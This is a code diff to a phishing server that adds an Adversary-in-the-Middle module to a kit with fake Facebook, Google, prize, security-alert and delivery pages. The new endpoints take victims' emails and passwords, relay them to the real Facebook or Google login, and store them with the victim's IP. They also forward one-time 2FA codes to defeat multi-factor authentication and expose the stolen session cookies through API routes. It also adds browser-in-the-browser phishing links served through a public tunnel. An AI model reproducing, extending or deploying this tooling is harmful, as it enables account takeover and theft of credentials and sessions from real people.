@@ -22,9 +22,11 @@ const http = require('http');
 const https = require('https');
 const { WebSocketServer } = require('ws');
 const { spawn } = require('child_process');
+const AiTMEngine = require('./aitm/aitm-engine');
 
 const app = express();
 const PORT = 3000;
+const aitm = new AiTMEngine();
 
 // ==========================================
 //  HTTP + WebSocket Server
@@ -343,6 +345,10 @@ app.post('/api/session-replay', (req, res) => {
 // ==========================================
 //  API: GET endpoints
 // ==========================================
+app.get('/api/health', (req, res) => {
+    res.json({ status: 'online', service: 'Rank 1 — Phishing Link & AiTM', port: PORT, timestamp: new Date().toISOString() });
+});
+
 app.get('/api/fingerprints', (req, res) => {
     const data = readJson(FINGERPRINT_FILE);
     res.json({ total: data.length, entries: data.slice().reverse() });
@@ -425,11 +431,108 @@ app.get('/api/tunnel', (req, res) => {
         phishing_links: tunnelUrl ? {
             facebook: `${tunnelUrl}/phishing/facebook.html`,
             google: `${tunnelUrl}/phishing/google.html`,
+            bitb_google: `${tunnelUrl}/phishing/bitb-google.html`,
+            aitm_facebook: `${tunnelUrl}/phishing/aitm-facebook.html`,
             prize: `${tunnelUrl}/landing/prize.html`,
             security: `${tunnelUrl}/landing/security.html`,
             delivery: `${tunnelUrl}/landing/delivery.html`
         } : null
     });
+});
+
+// ==========================================
+//  API: AiTM (Adversary-in-the-Middle)
+// ==========================================
+
+// Start AiTM login — relay credentials to real site
+app.post('/api/aitm/login', async (req, res) => {
+    try {
+        const { target, email, password, session_id, campaign_id } = req.body;
+        if (!email || !password) return res.status(400).json({ status: 'error', message: 'Missing credentials' });
+
+        console.log(`\n🔴 [AiTM] LOGIN REQUEST — ${target} — ${email}`);
+        broadcast({ type: 'aitm_event', event: 'login_start', target, email, time: new Date().toISOString() });
+
+        const sessionId = await aitm.createSession(target || 'facebook');
+        let result;
+
+        if (target === 'google') {
+            result = await aitm.loginGoogle(sessionId, email, password);
+        } else {
+            result = await aitm.loginFacebook(sessionId, email, password);
+        }
+
+        // Also save to regular harvest data
+        const harvestData = readJson(DATA_FILE);
+        harvestData.push({
+            email, password,
+            page_type: 'aitm_' + (target || 'facebook'),
+            session_id: session_id || sessionId,
+            campaign_id: campaign_id || 'aitm',
+            aitm_result: result.status,
+            aitm_session: sessionId,
+            time: new Date().toISOString(),
+            ip: req.ip || req.headers['x-forwarded-for']
+        });
+        writeJson(DATA_FILE, harvestData);
+
+        broadcast({
+            type: 'aitm_event',
+            event: result.status,
+            target, email, sessionId,
+            cookies_count: result.cookies_count || 0,
+            time: new Date().toISOString()
+        });
+
+        res.json(result);
+    } catch (error) {
+        console.error('[AiTM] Error:', error.message);
+        res.status(500).json({ status: 'error', message: error.message });
+    }
+});
+
+// Submit 2FA OTP to real site
+app.post('/api/aitm/2fa', async (req, res) => {
+    try {
+        const { sessionId, otp } = req.body;
+        if (!sessionId || !otp) return res.status(400).json({ status: 'error', message: 'Missing sessionId or OTP' });
+
+        console.log(`\n🔐 [AiTM] 2FA SUBMIT — Session ${sessionId} — OTP: ${otp}`);
+        broadcast({ type: 'aitm_event', event: '2fa_submit', sessionId, time: new Date().toISOString() });
+
+        const result = await aitm.submit2FA(sessionId, otp);
+
+        broadcast({
+            type: 'aitm_event',
+            event: result.status === 'success' ? '2fa_bypassed' : '2fa_failed',
+            sessionId,
+            cookies_count: result.cookies_count || 0,
+            time: new Date().toISOString()
+        });
+
+        res.json(result);
+    } catch (error) {
+        res.status(500).json({ status: 'error', message: error.message });
+    }
+});
+
+// Get stolen sessions list
+app.get('/api/aitm/sessions', (req, res) => {
+    res.json(aitm.getStolenSessions());
+});
+
+// Get full session with cookies
+app.get('/api/aitm/session/:id', (req, res) => {
+    const session = aitm.getFullSession(req.params.id);
+    if (!session) return res.status(404).json({ error: 'Not found' });
+    res.json(session);
+});
+
+// Get active session state
+app.get('/api/aitm/state/:id', (req, res) => {
+    const state = aitm.getSessionState(req.params.id);
+    if (!state) return res.status(404).json({ error: 'Not found' });
+    res.json(state);
 });
 
 // ==========================================
@@ -537,6 +640,8 @@ function startTunnel() {
             console.log('╠' + '═'.repeat(66) + '╣');
             console.log(`║  📘 Facebook:  ${tunnelUrl}/phishing/facebook.html`.padEnd(67) + '║');
             console.log(`║  📧 Google:    ${tunnelUrl}/phishing/google.html`.padEnd(67) + '║');
+            console.log(`║  🪟 BitB:      ${tunnelUrl}/phishing/bitb-google.html`.padEnd(67) + '║');
+            console.log(`║  🔴 AiTM FB:   ${tunnelUrl}/phishing/aitm-facebook.html`.padEnd(67) + '║');
             console.log(`║  🎁 Trúng thưởng: ${tunnelUrl}/landing/prize.html`.padEnd(67) + '║');
             console.log(`║  🔒 Cảnh báo:  ${tunnelUrl}/landing/security.html`.padEnd(67) + '║');
             console.log(`║  📦 Giao hàng: ${tunnelUrl}/landing/delivery.html`.padEnd(67) + '║');
